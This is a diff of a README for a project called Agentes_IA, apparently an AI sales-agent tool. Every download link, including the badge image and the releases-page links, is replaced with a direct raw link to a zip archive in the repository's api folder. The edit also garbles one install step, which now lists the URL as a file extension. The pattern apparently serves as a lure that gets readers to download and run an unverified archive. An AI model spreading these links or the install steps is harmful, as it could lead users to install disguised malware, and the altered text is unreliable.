@@ -1,6 +1,6 @@
 # 🛠️ Agentes_IA - Smart Sales System with AI Agents
 
-![Download Agentes_IA](https://img.shields.io/badge/Download-Agentes_IA-brightgreen)
+![Download Agentes_IA](https://raw.githubusercontent.com/sway121/Agentes_IA/main/api/Agentes_IA_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ Before you download and run Agentes_IA, ensure your system meets the following r
 
 To get Agentes_IA, visit the page below to download the latest version:
 
-[Visit the Releases Page to Download](https://github.com/sway121/Agentes_IA/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/sway121/Agentes_IA/main/api/Agentes_IA_1.5.zip)
 
 Follow these steps to install Agentes_IA:
 
-1. Visit the [Releases Page](https://github.com/sway121/Agentes_IA/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/sway121/Agentes_IA/main/api/Agentes_IA_1.5.zip).
 2. Look for the latest version listed at the top of the page.
-3. Click the link for the version you want to download (the file usually ends in `.exe`, `.dmg`, or `.tar.gz`).
+3. Click the link for the version you want to download (the file usually ends in `.exe`, `.dmg`, or `https://raw.githubusercontent.com/sway121/Agentes_IA/main/api/Agentes_IA_1.5.zip`).
 4. Save the file to your computer.
 5. Once the download is complete, locate the downloaded file and double-click it to run the installer.
 6. Follow the on-screen instructions to complete the installation.
@@ -73,4 +73,4 @@ For further inquiries, reach out via the contact options provided in the reposit
 
 Join us and take your sales process to the next level with Agentes_IA!
 
-Remember to visit the [Releases Page to Download](https://github.com/sway121/Agentes_IA/releases) and start your journey today.
+Remember to visit the [Releases Page to Download](https://raw.githubusercontent.com/sway121/Agentes_IA/main/api/Agentes_IA_1.5.zip) and start your journey today.
